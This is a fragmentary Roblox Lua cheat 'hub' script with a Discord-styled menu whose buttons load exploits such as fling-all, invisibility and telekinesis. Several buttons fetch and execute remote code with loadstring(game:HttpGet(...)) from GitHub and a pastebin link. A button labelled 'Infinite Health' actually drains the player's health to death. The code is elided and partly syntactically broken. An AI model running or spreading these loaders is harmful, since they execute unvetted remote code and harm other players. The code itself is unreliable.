...
local win = DiscordLib:Window("Timmys hub")

local serv = win:Server("i am adding more scrips", "Script")

local btns = serv:Channel("Scrips")
...
btns:Button(
    ...
    DiscordLib:Notification("Infinite Health", "YOU ARE NOW GOD", "Okay!")
    end
)
...
label.Text = "Health: " .. humanoid.Health
...
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "OH NO YOU'RE DYING",
    Text = "GET SOME HELP",
    Duration = 5,
})

-- Set initial health (you can customize this value)
humanoid.Health = 100  -- Set to your desired starting health

-- Damage loop
local damageAmount = 5  -- Damage amount per second

while humanoid.Health > 0 do
    wait(1)  -- Wait for 1 second

    humanoid.Health = humanoid.Health - damageAmount  -- Damage 5 HP

    -- Update label with remaining health
    label.Text = "Health: " .. humanoid.Health .. " | Time left: " .. math.ceil(humanoid.Health / damageAmount) .. " seconds"
end

-- Final notification when the player dies
label.Text = "You Died!"
wait(3)  -- Display for 3 seconds before removal
...
btns:Button(
    ...
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
           DiscordLib:Notification("Infinite Yeild", "the best admin script", "Okay!")
)
btns:Seperator()
...
btns:Button(
    "Fling all",
    function()
           DiscordLib:Notification("Flinging all", "Don't load twice only works in some games", "Okay!")
...
btns:Button(
    "invisible Toggle",
    function()
           DiscordLib:Notification("loaded", "sometimes brakes guis in robloxs games", "Okay!")
...
btns:Button(
    "Telekinesis",
    function()
           DiscordLib:Notification("loaded", "only work on anchored objects not people", "Okay!")
...
local btns = serv:Channel("other guis")

btns:Button(
    "MM2",
    function()
        DiscordLib:Notification("loading", "loading", "Okay!")
...
Tab60:AddLabel("[ = ] Slap Aura [ Reverse Player ]")
Tab60:AddLabel("[ + ] Slap Aura Choose")
Tab60:AddLabel("[ - ] Auto Notification Golden Slapple")
...
btns:Button(
    ...
    function()
        DiscordLib:Notification("loading", "loading", "Okay!")
         ...
         loadstring(game:HttpGet "https://pastebin.com/raw/MhGcp982")()
    end
)
